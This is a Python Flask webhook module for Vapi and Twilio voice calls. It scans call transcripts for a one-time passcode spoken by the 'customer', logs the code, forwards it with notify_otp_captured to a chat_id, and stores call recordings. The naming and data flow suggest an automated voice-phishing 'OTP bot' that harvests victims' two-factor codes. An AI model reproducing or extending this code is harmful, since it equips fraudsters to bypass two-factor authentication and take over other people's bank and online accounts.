import json
import logging
import re
from datetime import datetime
from typing import Optional

from flask import Response

logger = logging.getLogger(__name__)


def extract_otp_from_transcript(text: str, code_length: int = 6) -> Optional[str]:
    if not text:
        return None
    patterns = [
        rf"\b(\d{{{code_length}}})\b",
        rf"(\d\s?){{{code_length}}}",
    ]
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            raw = match.group(1) if match.lastindex else match.group(0)
            digits = re.sub(r"\s+", "", raw)
            if len(digits) == code_length and digits.isdigit():
                return digits

    all_digits = re.sub(r"\s+", "", re.sub(r"[^\d\s]", "", text))
    for i in range(len(all_digits) - code_length + 1):
        candidate = all_digits[i:i + code_length]
        if len(candidate) == code_length and candidate.isdigit():
            return candidate
    return None


def handle_vapi_webhook(request) -> Response:
    """Process incoming Vapi webhook events.

    Vapi sends events for: call.started, call.ended, transcript, recording.ready, etc.
    """
    try:
        payload = request.get_json(force=True, silent=True)
        if not payload:
            return Response("Invalid payload", status=400)

        event_type = payload.get("type") or payload.get("event") or payload.get("message", {}).get("type")
        call_data = payload.get("call") or payload.get("message", {}).get("call", {})
        vapi_call_id = call_data.get("id") or payload.get("callId")
        call_sid = call_data.get("twilioCallSid") or call_data.get("phoneCallProviderId")

        logger.info("[VAPI_WEBHOOK] type=%s vapi_call_id=%s call_sid=%s", event_type, vapi_call_id, call_sid)

        if event_type in ("call.started", "call.ringing"):
            return Response("OK")

        if event_type == "call.answered":
            return Response("OK")

        if event_type in ("transcript", "transcription", "call.transcript"):
            return _handle_transcript(payload, call_sid, vapi_call_id)

        if event_type in ("call.ended", "call.completed"):
            return _handle_call_ended(payload, call_sid, vapi_call_id)

        if event_type in ("recording.ready", "recording"):
            return _handle_recording(payload, call_sid, vapi_call_id)

        return Response("OK")

    except Exception as e:
        logger.error("[VAPI_WEBHOOK_ERROR] %s", e, exc_info=True)
        return Response("Error", status=500)


def _handle_transcript(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str]) -> Response:
    try:
        message = payload.get("message", payload)
        transcript_text = (
            message.get("transcript")
            or message.get("text")
            or message.get("transcription")
            or ""
        )
        role = message.get("role", "assistant")

        metadata = payload.get("metadata") or {}
        code_length = int(metadata.get("code_length", 6))
        user_id = metadata.get("user_id")
        chat_id = metadata.get("chat_id")

        if role == "customer" and transcript_text:
            otp = extract_otp_from_transcript(transcript_text, code_length)
            if otp:
                logger.info("[VAPI_OTP_DETECTED] otp=%s call_sid=%s", otp, call_sid)
                if chat_id and call_sid:
                    from handlers.otp_notifier import notify_otp_captured
                    notify_otp_captured(
                        chat_id=int(chat_id),
                        call_sid=call_sid,
                        digits=otp,
                        user_id=user_id or "unknown",
                    )
        return Response("OK")
    except Exception as e:
        logger.error("[VAPI_TRANSCRIPT_ERROR] %s", e)
        return Response("OK")


def _handle_call_ended(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str]) -> Response:
    try:
        call_data = payload.get("call", payload)
        duration = call_data.get("durationMs") or call_data.get("duration", 0)
        status = call_data.get("status", "completed")
        logger.info("[VAPI_CALL_ENDED] call_sid=%s duration=%s status=%s", call_sid, duration, status)

        if call_sid:
            from bot import log_call_completion, get_twilio_client
            client = get_twilio_client()
            if client:
                try:
                    recording_sids = [
                        r.get("sid") for r in (call_data.get("recordings") or [])
                    ]
                except Exception:
                    recording_sids = []
                log_call_completion(call_sid, status, str(duration), recording_sids)
        return Response("OK")
    except Exception as e:
        logger.error("[VAPI_CALL_ENDED_ERROR] %s", e)
        return Response("OK")


def _handle_recording(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str]) -> Response:
    try:
        recording_url = (
            payload.get("recordingUrl")
            or payload.get("message", {}).get("recordingUrl")
            or payload.get("call", {}).get("recordingUrl")
        )
        if recording_url and call_sid:
            metadata = payload.get("metadata", {})
            user_id = metadata.get("user_id")
            if user_id:
                from bot import download_and_store_recording
                download_and_store_recording(call_sid, user_id, recording_url)
        return Response("OK")
    except Exception as e:
        logger.error("[VAPI_RECORDING_ERROR] %s", e)
        return Response("OK")
